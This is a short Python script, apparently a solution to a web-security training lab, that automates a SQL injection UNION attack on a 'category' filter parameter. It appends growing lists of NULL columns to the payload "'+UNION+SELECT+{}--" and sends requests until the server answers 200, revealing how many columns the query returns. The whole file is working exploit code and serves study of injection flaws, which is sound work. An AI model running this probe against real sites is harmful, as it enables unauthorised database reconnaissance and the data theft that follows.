#!/usr/bin/env python3
"""
SQL injection UNION attack, determining the number of columns
returned by the query
"""

from typing import Generator, NamedTuple

import lab_02

NullCount = NamedTuple("NullCount", [("count", int), ("nulls", str)])

# pylint: disable=too-few-public-methods
class Lab(lab_02.Lab):
    """Wrapper"""

    @staticmethod
    def _null_generator() -> Generator[NullCount, None, None]:
        """A bunch of NULLs"""
        count = 0
        while True:
            count += 1
            yield NullCount(count, ",".join(["NULL"] * count))

    def column_count(self, key: str, path: str) -> int:
        """Get the number of columns"""
        query_template = "'+UNION+SELECT+{}--"
        for repeated_null in self._null_generator():
            payload = {key: query_template.format(repeated_null.nulls)}
            payload_str = "&".join("%s=%s" % (k, v) for k, v in payload.items())
            response = self.session.get(self.url + path, params=payload_str)
            if response.status_code == 200:
                return repeated_null.count
            if response.status_code == 404:
                raise RuntimeError("404: ensure LAB_ID is correct")
        raise RuntimeError

def main() -> None:
    """Entry point"""
    site = Lab()
    print(site.column_count(key="category", path="/filter"))

if __name__ == "__main__":
    main()
